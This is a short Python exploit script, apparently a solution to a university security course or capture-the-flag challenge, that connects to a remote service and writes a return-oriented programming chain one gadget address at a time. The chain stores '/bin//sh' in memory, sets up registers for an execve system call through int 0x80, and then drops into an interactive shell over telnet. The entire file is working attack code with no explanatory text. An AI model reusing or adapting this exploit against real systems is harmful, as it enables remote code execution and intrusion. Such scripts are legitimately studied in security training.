# Echo client program
import telnetlib
import socket,sys

def gen_payload(s, offset, address):
    rop_start = 360
    payload = str(rop_start+offset) + "+00+" + str(int(address, 0)) + "\n"
    s.send(payload)
    sys.stdout.write(payload)
    sys.stdout.flush()

    buf = s.recv(64)
    sys.stdout.write(buf)
    sys.stdout.flush()

if __name__ == "__main__":
    # The remote host
    host = 'secprog.cs.nctu.edu.tw' 
    #host = 'localhost' 
    port = 10042
    #port = 55680

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    buf = s.recv(64)
    sys.stdout.write(buf)
    sys.stdout.flush()

    gen_payload(s, 33, "0x08049a21") # int 0x80
    gen_payload(s, 32, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 31, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 30, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 29, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 28, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 27, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 26, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 25, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 24, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 23, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 22, "0x0807cb7f") # inc eax ; ret
    gen_payload(s, 21, "0x080550d0") # xor eax, eax ; ret
    gen_payload(s, 20, "0x080ec068") # @ .data + 8
    gen_payload(s, 19, "0x080701aa") # pop edx ; ret
    gen_payload(s, 18, "0x080ec060") # padding without overwrite ebx
    gen_payload(s, 17, "0x080ec068") # @ .data + 8
    gen_payload(s, 16, "0x080701d1") # pop ecx ; pop ebx ; ret
    gen_payload(s, 15, "0x080ec060") # @ .data
    gen_payload(s, 14, "0x080481d1") # pop ebx ; ret
    gen_payload(s, 13, "0x0809b30d") # mov dword ptr [edx], eax ; ret
    gen_payload(s, 12, "0x080550d0") # xor eax, eax ; ret
    gen_payload(s, 11, "0x080ec068") # @ .data + 8
    gen_payload(s, 10, "0x080701aa") # pop edx ; ret
    gen_payload(s, 9, "0x0809b30d") # mov dword ptr [edx], eax ; ret
    gen_payload(s, 8, "0x68732f2f") # '//sh'
    gen_payload(s, 7, "0x0805c34b") # pop eax ; ret
    gen_payload(s, 6, "0x080ec064") # @ .data + 4
    gen_payload(s, 5, "0x080701aa") # pop edx ; ret
    gen_payload(s, 4, "0x0809b30d") # mov dword ptr [edx], eax ; ret
    gen_payload(s, 3, "0x6e69622f") # '/bin'
    gen_payload(s, 2, "0x0805c34b") # pop eax ; ret
    gen_payload(s, 1, "0x080ec060") # @ .data
    gen_payload(s, 0, "0x080701aa") # pop edx ; ret
 
    t = telnetlib.Telnet()
    t.sock = s 
    t.interact()
